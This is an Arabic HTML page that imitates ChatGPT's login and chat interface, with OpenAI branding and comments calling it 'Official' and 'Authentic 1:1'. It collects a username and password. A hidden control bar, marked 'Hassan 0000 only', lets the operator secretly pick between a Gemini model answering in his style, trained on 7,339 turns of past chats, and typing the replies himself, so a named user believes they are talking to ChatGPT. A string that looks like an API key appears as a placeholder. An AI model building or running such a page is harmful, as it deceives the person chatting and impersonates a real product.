<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>ChatGPT</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="style.css">
  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><circle cx='50' cy='50' r='50' fill='%2310a37f'/><path d='M70 50A20 20 0 0 1 50 70A20 20 0 0 1 30 50A20 20 0 0 1 50 30A20 20 0 0 1 70 50Z' fill='white'/></svg>">
</head>
<body>

  <!-- Screen 1: Official ChatGPT Login Screen -->
  <div id="screen-login" class="screen-view active">
    <div class="login-container">
      <div class="openai-brand-icon">
        <svg viewBox="0 0 24 24" width="44" height="44" fill="currentColor">
          <path d="M22.2819 9.8211a5.9847 5.9847 0 0 0-.5157-4.9108 6.0462 6.0462 0 0 0-6.5098-2.9A6.0651 6.0651 0 0 0 4.9807 4.1818a5.9847 5.9847 0 0 0-3.9977 2.9 6.0462 6.0462 0 0 0 .7427 7.0966 5.98 5.98 0 0 0 .511 4.9107 6.051 6.051 0 0 0 6.5146 2.9001A5.9847 5.9847 0 0 0 13.2594 24a6.0557 6.0557 0 0 0 5.7718-4.2058 5.9894 5.9894 0 0 0 3.9977-2.9001 6.0557 6.0557 0 0 0-.747-7.0729zm-9.022 12.6081a4.4755 4.4755 0 0 1-2.8764-1.0408l.1419-.0804 4.7783-2.7582a.7948.7948 0 0 0 .3927-.6813v-6.7369l2.02 1.1686a.071.071 0 0 1 .038.052v5.5826a4.504 4.504 0 0 1-4.4945 4.4944zm-9.6607-4.1254a4.4708 4.4708 0 0 1-.5346-3.0137l.142.0852 4.783 2.7582a.7712.7712 0 0 0 .7806 0l5.8428-3.3685v2.3324a.0804.0804 0 0 1-.0332.0615L9.74 19.9502a4.4992 4.4992 0 0 1-6.1408-1.6464zM2.3408 7.8956a4.485 4.485 0 0 1 2.3655-1.9728V11.6a.7664.7664 0 0 0 .3879.6765l5.8144 3.3543-2.0201 1.1685a.0757.0757 0 0 1-.071 0l-4.8303-2.7865A4.504 4.504 0 0 1 2.3408 7.872zm16.5963 3.8558L13.1038 8.364 15.1192 7.2a.0757.0757 0 0 1 .071 0l4.8303 2.7913a4.4944 4.4944 0 0 1-.6765 8.1042v-5.6772a.79.79 0 0 0-.407-.6669zm2.0107-3.0231l-.142-.0852-4.7735-2.7818a.7759.7759 0 0 0-.7854 0L9.409 9.2297V6.8974a.0662.0662 0 0 1 .0284-.0615l4.8303-2.7866a4.4992 4.4992 0 0 1 6.6802 4.66zM8.3065 12.863l-2.02-1.1638a.0804.0804 0 0 1-.038-.0567V6.0742a4.4992 4.4992 0 0 1 7.3757-3.4537l-.142.0805L8.704 5.459a.7948.7948 0 0 0-.3927.6813zm1.0976-2.3654l2.602-1.4998 2.6069 1.4998v2.9994l-2.5974 1.4997-2.6067-1.4997Z"/>
        </svg>
      </div>

      <h1 class="login-heading">مرحبًا بك مجددًا</h1>
      <p class="login-subheading">سجّل الدخول للمتابعة إلى ChatGPT</p>

      <form id="login-form" onsubmit="handleLoginSubmit(event)">
        <div class="login-input-wrap">
          <input type="text" id="login-username" class="login-input" placeholder="اسم المستخدم أو البريد الإلكتروني" required autocomplete="off">
        </div>
        <div class="login-input-wrap">
          <input type="password" id="login-password" class="login-input" placeholder="كلمة المرور" required>
        </div>

        <button type="submit" class="login-submit-btn">متابعة</button>

        <div id="login-err" class="login-error-badge hidden">
          اسم المستخدم أو كلمة المرور غير صحيحة
        </div>
      </form>
    </div>
  </div>

  <!-- Screen 2: Authentic 1:1 ChatGPT Workspace -->
  <div id="screen-chat" class="screen-view">
    <div class="chatgpt-layout">

      <!-- Sidebar -->
      <aside class="chatgpt-sidebar" id="sidebar">
        <div class="sidebar-top-row">
          <button class="sidebar-icon-btn" onclick="toggleSidebarMenu()" title="إغلاق الشريط الجانبي">
            <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2">
              <rect x="3" y="3" width="18" height="18" rx="2" ry="2"/>
              <line x1="9" y1="3" x2="9" y2="21"/>
            </svg>
          </button>
          
          <button class="sidebar-icon-btn" onclick="startNewChatSession()" title="محادثة جديدة">
            <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2">
              <path d="M12 5v14M5 12h14"/>
            </svg>
          </button>
        </div>

        <div class="sidebar-chat-history">
          <div class="history-label">اليوم</div>
          <div class="history-item active">
            <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2">
              <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>
            </svg>
            <span class="history-title">محادثة شخصية</span>
          </div>
        </div>

        <div class="sidebar-footer">
          <div class="sidebar-user-pill" onclick="handleLogout()" title="تسجيل الخروج">
            <div class="user-avatar-circle" id="user-avatar-letter">R</div>
            <div class="user-details">
              <span class="user-name" id="user-display-name">روقا</span>
              <span class="user-action">تسجيل الخروج</span>
            </div>
          </div>
        </div>
      </aside>

      <!-- Main Chat Area -->
      <main class="chatgpt-main">

        <!-- Top Header -->
        <header class="chatgpt-topbar">
          <div class="topbar-left">
            <button class="topbar-icon-btn mobile-menu-btn" onclick="toggleSidebarMenu()" title="القائمة">
              <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2">
                <rect x="3" y="3" width="18" height="18" rx="2" ry="2"/>
                <line x1="9" y1="3" x2="9" y2="21"/>
              </svg>
            </button>

            <div class="model-selector-btn">
              <span class="model-name-text">ChatGPT</span>
              <span class="model-badge">4o</span>
              <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5">
                <path d="m6 9 6 6 6-6"/>
              </svg>
            </div>
          </div>

          <div class="topbar-right">
            <!-- Settings button (Hassan 0000 only) -->
            <button id="admin-settings-btn" class="topbar-icon-btn hidden" onclick="toggleSettingsModal()" title="إعدادات الـ API">
              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2">
                <circle cx="12" cy="12" r="3"/>
                <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 1 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 1 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 1 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 1 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/>
              </svg>
            </button>

            <button class="topbar-icon-btn" onclick="startNewChatSession()" title="مسح المحادثة">
              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2">
                <polyline points="3 6 5 6 21 6"/>
                <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/>
              </svg>
            </button>
          </div>
        </header>

        <!-- Secret Control Bar (Hassan 0000 only) -->
        <div id="hassan-admin-bar" class="admin-control-bar hidden">
          <div class="admin-bar-controls">
            <button id="btn-mode-ai" class="admin-toggle-btn active" onclick="switchHassanMode('ai')">
              <span class="status-indicator-dot dot-green"></span>
              <span>الـ AI بيرد تلقائياً</span>
            </button>
            <button id="btn-mode-manual" class="admin-toggle-btn" onclick="switchHassanMode('manual')">
              <span class="status-indicator-dot dot-blue"></span>
              <span>أنا هرد بنفسي</span>
            </button>
          </div>
          <span id="admin-status-hint" class="admin-status-hint">الـ AI مفعّل وبيرد بأسلوبك من شاتكم</span>
        </div>

        <!-- Chat Messages Container -->
        <div class="chat-viewport" id="chat-viewport">
          <div class="chat-content-flow" id="chat-content-flow">

            <!-- Empty State Greeting -->
            <div id="empty-state-card" class="empty-state-container">
              <div class="empty-state-emblem">
                <svg viewBox="0 0 24 24" width="46" height="46" fill="currentColor">
                  <path d="M22.2819 9.8211a5.9847 5.9847 0 0 0-.5157-4.9108 6.0462 6.0462 0 0 0-6.5098-2.9A6.0651 6.0651 0 0 0 4.9807 4.1818a5.9847 5.9847 0 0 0-3.9977 2.9 6.0462 6.0462 0 0 0 .7427 7.0966 5.98 5.98 0 0 0 .511 4.9107 6.051 6.051 0 0 0 6.5146 2.9001A5.9847 5.9847 0 0 0 13.2594 24a6.0557 6.0557 0 0 0 5.7718-4.2058 5.9894 5.9894 0 0 0 3.9977-2.9001 6.0557 6.0557 0 0 0-.747-7.0729zm-9.022 12.6081a4.4755 4.4755 0 0 1-2.8764-1.0408l.1419-.0804 4.7783-2.7582a.7948.7948 0 0 0 .3927-.6813v-6.7369l2.02 1.1686a.071.071 0 0 1 .038.052v5.5826a4.504 4.504 0 0 1-4.4945 4.4944zm-9.6607-4.1254a4.4708 4.4708 0 0 1-.5346-3.0137l.142.0852 4.783 2.7582a.7712.7712 0 0 0 .7806 0l5.8428-3.3685v2.3324a.0804.0804 0 0 1-.0332.0615L9.74 19.9502a4.4992 4.4992 0 0 1-6.1408-1.6464zM2.3408 7.8956a4.485 4.485 0 0 1 2.3655-1.9728V11.6a.7664.7664 0 0 0 .3879.6765l5.8144 3.3543-2.0201 1.1685a.0757.0757 0 0 1-.071 0l-4.8303-2.7865A4.504 4.504 0 0 1 2.3408 7.872zm16.5963 3.8558L13.1038 8.364 15.1192 7.2a.0757.0757 0 0 1 .071 0l4.8303 2.7913a4.4944 4.4944 0 0 1-.6765 8.1042v-5.6772a.79.79 0 0 0-.407-.6669zm2.0107-3.0231l-.142-.0852-4.7735-2.7818a.7759.7759 0 0 0-.7854 0L9.409 9.2297V6.8974a.0662.0662 0 0 1 .0284-.0615l4.8303-2.7866a4.4992 4.4992 0 0 1 6.6802 4.66zM8.3065 12.863l-2.02-1.1638a.0804.0804 0 0 1-.038-.0567V6.0742a4.4992 4.4992 0 0 1 7.3757-3.4537l-.142.0805L8.704 5.459a.7948.7948 0 0 0-.3927.6813zm1.0976-2.3654l2.602-1.4998 2.6069 1.4998v2.9994l-2.5974 1.4997-2.6067-1.4997Z"/>
                </svg>
              </div>
              <h2 class="empty-state-title">بماذا يمكنني مساعدتك اليوم؟</h2>
            </div>

            <!-- Messages Stream -->
            <div id="messages-container" class="messages-container"></div>

            <!-- Typing Indicator (ChatGPT 3 pulsing dots) -->
            <div id="typing-indicator" class="chatgpt-message-row row-assistant hidden">
              <div class="assistant-avatar">
                <svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
                  <path d="M22.2819 9.8211a5.9847 5.9847 0 0 0-.5157-4.9108 6.0462 6.0462 0 0 0-6.5098-2.9A6.0651 6.0651 0 0 0 4.9807 4.1818a5.9847 5.9847 0 0 0-3.9977 2.9 6.0462 6.0462 0 0 0 .7427 7.0966 5.98 5.98 0 0 0 .511 4.9107 6.051 6.051 0 0 0 6.5146 2.9001A5.9847 5.9847 0 0 0 13.2594 24a6.0557 6.0557 0 0 0 5.7718-4.2058 5.9894 5.9894 0 0 0 3.9977-2.9001 6.0557 6.0557 0 0 0-.747-7.0729zm-9.022 12.6081a4.4755 4.4755 0 0 1-2.8764-1.0408l.1419-.0804 4.7783-2.7582a.7948.7948 0 0 0 .3927-.6813v-6.7369l2.02 1.1686a.071.071 0 0 1 .038.052v5.5826a4.504 4.504 0 0 1-4.4945 4.4944zm-9.6607-4.1254a4.4708 4.4708 0 0 1-.5346-3.0137l.142.0852 4.783 2.7582a.7712.7712 0 0 0 .7806 0l5.8428-3.3685v2.3324a.0804.0804 0 0 1-.0332.0615L9.74 19.9502a4.4992 4.4992 0 0 1-6.1408-1.6464zM2.3408 7.8956a4.485 4.485 0 0 1 2.3655-1.9728V11.6a.7664.7664 0 0 0 .3879.6765l5.8144 3.3543-2.0201 1.1685a.0757.0757 0 0 1-.071 0l-4.8303-2.7865A4.504 4.504 0 0 1 2.3408 7.872zm16.5963 3.8558L13.1038 8.364 15.1192 7.2a.0757.0757 0 0 1 .071 0l4.8303 2.7913a4.4944 4.4944 0 0 1-.6765 8.1042v-5.6772a.79.79 0 0 0-.407-.6669zm2.0107-3.0231l-.142-.0852-4.7735-2.7818a.7759.7759 0 0 0-.7854 0L9.409 9.2297V6.8974a.0662.0662 0 0 1 .0284-.0615l4.8303-2.7866a4.4992 4.4992 0 0 1 6.6802 4.66zM8.3065 12.863l-2.02-1.1638a.0804.0804 0 0 1-.038-.0567V6.0742a4.4992 4.4992 0 0 1 7.3757-3.4537l-.142.0805L8.704 5.459a.7948.7948 0 0 0-.3927.6813zm1.0976-2.3654l2.602-1.4998 2.6069 1.4998v2.9994l-2.5974 1.4997-2.6067-1.4997Z"/>
                </svg>
              </div>
              <div class="assistant-content">
                <div class="typing-dots-pill">
                  <span class="pulse-dot"></span>
                  <span class="pulse-dot"></span>
                  <span class="pulse-dot"></span>
                </div>
              </div>
            </div>

          </div>
        </div>

        <!-- Floating Input Dock -->
        <div class="input-dock-wrapper">
          <div class="input-container-box">
            <textarea
              id="chat-textarea"
              placeholder="اكتب رسالة..."
              rows="1"
              onkeydown="handleInputKeydown(event)"
              oninput="handleTextareaInput(this)"></textarea>

            <button id="send-message-btn" class="chatgpt-send-button" onclick="handleSendMessage()" title="إرسال">
              <!-- Iconic upward arrow of ChatGPT -->
              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                <line x1="12" y1="19" x2="12" y2="5"/>
                <polyline points="5 12 12 5 19 12"/>
              </svg>
            </button>
          </div>
          <p class="chatgpt-footer-disclaimer">قد يرتكب ChatGPT أخطاء. تحقق من المعلومات المهمة.</p>
        </div>

      </main>
    </div>
  </div>

  <!-- Settings Modal (Hassan 0000 only) -->
  <div id="settings-modal" class="modal-backdrop hidden">
    <div class="settings-modal-dialog">
      <div class="modal-dialog-header">
        <h3>إعداد مفتاح Gemini API</h3>
        <button class="modal-close-btn" onclick="toggleSettingsModal()">✕</button>
      </div>
      <div class="modal-dialog-body">
        <label>مفتاح API الخاص بك:</label>
        <input type="password" id="modal-key-input" placeholder="AQ.Ab8RN6Iibnaf8lY024FJOmCybsYiXSD6YvFlaggc3lq95UgYLQ">
        <div class="modal-dialog-footer">
          <button class="modal-save-btn" onclick="saveApiKeySetting()">حفظ المفتاح</button>
        </div>
      </div>
    </div>
  </div>

  <!-- Chat memory script (7,339 cleaned turns) -->
  <script src="chat_memory.js"></script>
  <!-- Main application script -->
  <script src="app.js"></script>
</body>
</html>
